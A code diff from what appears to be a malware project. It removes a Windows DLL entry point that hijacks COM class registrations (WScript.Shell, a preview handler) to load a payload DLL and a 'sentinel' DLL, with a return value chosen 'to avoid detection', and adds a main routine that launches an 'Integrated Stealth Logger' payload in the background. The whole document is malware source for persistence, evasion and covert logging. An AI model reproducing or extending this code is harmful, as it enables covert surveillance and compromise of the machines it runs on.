@@ -1,41 +1,29 @@
 #include "payload.h"
-#include "com_hijack.h"
-#include "com_hijack_config.h"
-#include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
 
-// DllMain entry point
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call) {
-        case DLL_PROCESS_ATTACH:
-            // Hijack high-traffic COM objects when DLL is loaded
-            HijackCOMCLSID(WSCRIPT_SHELL_CLSID, "C:\\Windows\\System32\\payload.dll");
-            HijackCOMCLSID(TEXT_PREVIEW_HANDLER_CLSID, "C:\\Windows\\System32\\payload.dll");
-            
-            // Load and execute sentinel DLL
-            HMODULE sentinelDll = LoadLibraryA("C:\\Windows\\System32\\sentinel.dll");
-            if (sentinelDll) {
-                // Call exported function to start sentinel
-                typedef void (*StartSentinelFunc)();
-                StartSentinelFunc StartSentinel = (StartSentinelFunc)GetProcAddress(sentinelDll, "StartSentinel");
-                if (StartSentinel) {
-                    StartSentinel();
-                }
-            }
-            break;
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DETACH:
-            break;
-    }
-    return TRUE;
+static void handle_signal(int sig) {
+	printf("\nReceived signal %d, stopping payload...\n", sig);
+	stop_payload();
+	exit(0);
 }
 
-// Exported function for COM hijack
-__declspec(dllexport) HRESULT STDMETHODCALLTYPE CreateInstance(REFIID riid, void** ppvObject) {
-    // Load sentinel DLL and execute payload
-    LoadLibraryA("C:\\Windows\\System32\\sentinel.dll");
-    
-    // Return E_NOINTERFACE to avoid detection
-    return E_NOINTERFACE;
+int main() {
+	// Set up signal handlers
+	signal(SIGINT, handle_signal);
+	signal(SIGTERM, handle_signal);
+	
+	printf("Starting Integrated Stealth Logger...\n");
+	init_payload();
+	
+	printf("Payload running in background. Press Ctrl+C to stop.\n");
+	
+	// Keep main thread alive
+	while (1) {
+		sleep(1);
+	}
+	
+	return 0;
 }
